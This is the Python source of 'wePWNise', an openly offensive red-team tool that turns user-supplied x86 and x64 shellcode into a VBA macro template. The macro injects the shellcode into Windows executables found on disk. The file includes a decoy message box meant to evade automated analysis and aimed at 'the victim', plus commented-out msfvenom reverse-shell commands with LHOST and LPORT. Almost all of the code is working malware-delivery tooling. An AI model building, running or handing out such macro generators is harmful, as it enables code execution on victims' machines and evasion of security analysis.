import argparse
import sys

from termcolor import colored

version = "0.32 BETA"


class Wepwnise(object):
    def __init__(self):
        self.args = None
        self.pay64 = None
        self.pay86 = None

        self.templates = {'PAYLOAD_86': self.payload86,
                          'PAYLOAD_64': self.payload64,
                          'PAYLOAD_86_LEN': self.payload86_len,
                          'PAYLOAD_64_LEN': self.payload64_len,
                          'INJECT_64': self.inject64,
                          'DIR_PATHS': self.dir_paths,
                          'BIN_PATHS': self.bin_paths,
                          'MSGBOX': self.msgbox}

    def printBanner(self):
        with open('banner.txt', 'r') as f:
            data = f.read()

            print colored(data, "red")
            print colored("Version %s" % version, "yellow")
            print colored("Author: Vincent Yiu (@vysec, @vysecurity)", "yellow")

    def run(self, args):
        self.printBanner()

        print ""

        w.check_args(args)

        print ""
        print colored("[*] Welcome to wePWNise", "blue")

        self.obtain_payloads()
        self.output()

    def obtain_payloads(self):
        print ""
        print colored("[+] Obtaining payloads", "green")

        print colored("\t X86 PAYLOAD", "green")
        pay86a = ""
        with open(self.args.i86, "rb") as f:
            byte = f.read(1)
            while byte != "":
                # Do stuff with byte.
                byte = f.read(1)
                if byte:
                    pay86a += hex(ord(byte)) + ","
        pay86a = pay86a[:len(pay86a) - 1]
        print pay86a

        # pay86 = os.popen("msfvenom -p %s LHOST=%s LPORT=%s -f num" % (args.x86, args.lhost86, args.lport86)).read()
        print colored("\t X64 PAYLOAD", "green")
        pay64a = ""
        with open(self.args.i64, "rb") as f:
            byte = f.read(1)
            while byte != "":
                # Do stuff with byte.
                byte = f.read(1)
                if byte:
                    pay64a += hex(ord(byte)) + ","
        pay64a = pay64a[:len(pay64a) - 1]
        print pay64a

        # pay64 = os.popen("msfvenom -p %s LHOST=%s LPORT=%s -f num" % (args.x64, args.lhost64, args.lport64)).read()
        print colored("[+] Payloads obtained successfully", "green")
        print colored("[+] Formatting payloads", "green")
        self.pay86 = pay86a.split(",")
        self.pay64 = pay64a.split(",")
        print colored("[+] Formatting complete", "green")

    def make_argparser(self):
        parser = argparse.ArgumentParser(description = "")
        parser.add_argument("-i86", metavar="<x86_shellcode>", required = True, help = "Input x86 raw shellcode")
        parser.add_argument("-i64", metavar="<x64_shellcode>", required = True, help = "Input x64 raw shellcode")

        parser.add_argument("--inject64",  metavar="", dest = "inject64", default = True,
                            help = "Inject into 64 Bit. Set to False when delivering x86 payloads only. Default is True")
        parser.add_argument("--out", metavar="<output_file>", default = "wepwnise.txt", help = "File to output the VBA macro to")
        parser.add_argument("--msgbox", metavar="", default = True, dest = "msgbox",
                            help = "Present messagebox to prevent automated analysis. Default is True.")
        parser.add_argument("--msg", metavar="<window_message>", default = "This document will begin decrypting, please allow up to 5 minutes",
                            dest = "msg",
                            help = "Custom message to present the victim if --msgbox is set to True")
        return parser

    def check_args(self, args):
        self.args = args
        scReady = False

        # At this point we know that we have the correct LHOST and LPORT ready for smexiness
        # We also validated our parameters to all be correct

        if (self.args.i64 and self.args.i86):
            scReady = True

        # Invalid, do not continue
        if (not scReady):
            sys.exit("Both x86 and x64 shellcode must be specified")

    def msgbox(self):
        """Generate messagebox text"""
        output = ""
        if self.args.msgbox == True:
            output = ("MsgBox \"%s\"" % self.args.msg)
        return output

    def bin_paths(self):
        """Generate List of Binary Paths"""
        output = []
        f = open('binary-paths.txt', 'r')

        binPaths = f.readlines()

        for p in binPaths:
            q = p.replace("\n", "")
            output += [("myList = myList & \"%s\" & \",\"" % q)]
        f.close()
        return "\r\n".join(output)

    def dir_paths(self):
        output = []
        f = open('directory-paths.txt', 'r')

        dirPaths = f.readlines()

        for p in dirPaths:
            q = p.replace("\n", "")
            output += [("RecursiveDir colFiles, \"%s\", \"*.exe\", True" % q)]
        return "\r\n".join(output)

    def inject64(self):
        return str(self.args.inject64)

    def payload64_len(self):
        return hex(len(self.pay64) + 30)[2:]

    def payload86_len(self):
        return hex(len(self.pay86) + 30)[2:]

    def payload64(self):
        return self.payload(self.pay64)

    def payload86(self):
        return self.payload(self.pay86)

    def payload(self, pay):
        """Generate 64 bit payload into position"""
        output = ["buf = Array("]
        length = len(pay) - 1
        total = 0

        # Insert 64 bit payload into position
        lCount = 0
        for i in pay:
            if (total != length):
                if (lCount < 100):
                    output += ["%s," % str(int(i, 16))]
                else:
                    output += ["%s, _\r\n" % (str(int(i, 16)))]
                    lCount = 0
            else:
                output += ["%s)" % (str(int(i, 16)))]

            lCount += 1
            total += 1
        return "".join(output)

    def generate_output(self):
        f = open("template.txt", "r")
        output = ""
        for line in f.readlines():
            for template in self.templates:
                template_text = "{{ " + template + " }}"
                if template_text in line:
                    line = line.replace(template_text, self.templates[template]())
            # Only output on non-blank lines
            if line and line != "\r\n":
                output += line
        return output

    def output(self):
        # Open and write to text file

        print colored("[+] Begin writing payload to: %s" % self.args.out, "green")

        f = open(self.args.out, 'w+')

        f.writelines(self.generate_output())

        f.close()

        print colored("[+] Payload written", "green")

        print ""


if __name__ == '__main__':
    w = Wepwnise()
    parser = w.make_argparser()

    arguments = parser.parse_args()
    w.run(arguments)
